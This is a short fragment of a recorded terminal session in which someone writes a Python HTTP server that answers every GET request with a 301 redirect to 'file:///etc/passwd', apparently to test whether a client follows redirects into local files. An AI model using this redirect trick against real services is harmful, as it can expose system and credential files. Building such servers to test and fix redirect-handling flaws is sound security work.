[338.071646, "o", "> "]
[338.071758, "o", "class Redirect(BaseHTTPRequestHandler):\r\n\u001b[?2004l\r\u001b[?2004h"]
[338.071867, "o", ">     def do_GET(self):\r\n\u001b[?2004l\r\u001b[?2004h"]
[338.072048, "o", ">         self.send_response(301)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[338.072237, "o", "        self.send_header('Location', 'file:///etc/passwd')\r\n\u001b[?2004l\r\u001b[?2004h"]
[338.072305, "o", "> "]
[338.072458, "o", "        self.end_headers()\r\n\u001b[?2004l\r"]
[338.072573, "o", "\u001b[?2004h> "]
[338.072795, "o", "HTTPServer(('', 8000), Redirect).serve_forever()\r\n\u001b[?2004l\r\u001b[?2004h> EOF\r\n"]
